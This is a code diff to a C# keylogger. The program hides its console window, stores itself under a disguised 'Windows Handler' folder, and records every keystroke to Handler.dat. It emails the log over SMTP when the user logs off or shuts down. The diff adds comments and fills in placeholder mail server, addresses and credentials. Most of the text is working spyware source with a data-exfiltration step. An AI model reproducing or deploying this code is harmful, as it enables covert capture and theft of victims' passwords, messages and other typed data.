@@ -12,10 +12,9 @@ namespace Keylogger
     public class Program
     {
         public static bool chcSysEve = false;
-        public static string path = @"C:\Windows Handler\";
-        public static string pathTxt = @"C:\Windows Handler\Handler.dat";
+        public static string path = @"C:\Windows Handler\"; //Example directory
+        public static string pathTxt = @"C:\Windows Handler\Handler.dat"; //Handler.dat stores keystrokes
 
-        //public static string appPath = Path.GetDirectoryName(Application.ExecutablePath);
         public static string appName = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
         public static string appExe = Path.GetFileName(appName);
         static string regdit = path + appExe;
@@ -28,8 +27,6 @@ namespace Keylogger
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
         const int SW_HIDE = 0;
-        //const int SW_SHOW = 5;
-        
 
         static void Main(string[] args)
         {
@@ -65,7 +62,8 @@ namespace Keylogger
                             int keyState = GetAsyncKeyState(i);
                             if (keyState == 1 || keyState == -32767)
                             {
-                                SystemEvents.SessionEnding += SystemEvents_SessionEnding;
+                                SystemEvents.SessionEnding += SystemEvents_SessionEnding; //If program detects user logging off or shuting down system
+                                //it sends mail
                                 Console.WriteLine((Keys)i);
                                 writer.WriteLine((Keys)i);
                                 writer.Flush();
@@ -112,9 +110,9 @@ namespace Keylogger
             try
             {
                 MailMessage mail = new MailMessage();
-                SmtpClient SmtpServer = new SmtpClient("");
-                mail.From = new MailAddress("");
-                mail.To.Add("");
+                SmtpClient SmtpServer = new SmtpClient("smtp.example.com");
+                mail.From = new MailAddress("fromUser@example.com");
+                mail.To.Add("toUser@example.com");
                 mail.Subject = "Saved keys from " + date;
                 mail.Body = "Keystrokes saved from user " + user;
 
@@ -123,7 +121,7 @@ namespace Keylogger
                 mail.Attachments.Add(attachment);
 
                 SmtpServer.Port = 587;
-                SmtpServer.Credentials = new System.Net.NetworkCredential("", "");
+                SmtpServer.Credentials = new System.Net.NetworkCredential("fromUser@example.com", "password");
                 SmtpServer.EnableSsl = true;
 
                 SmtpServer.Send(mail);
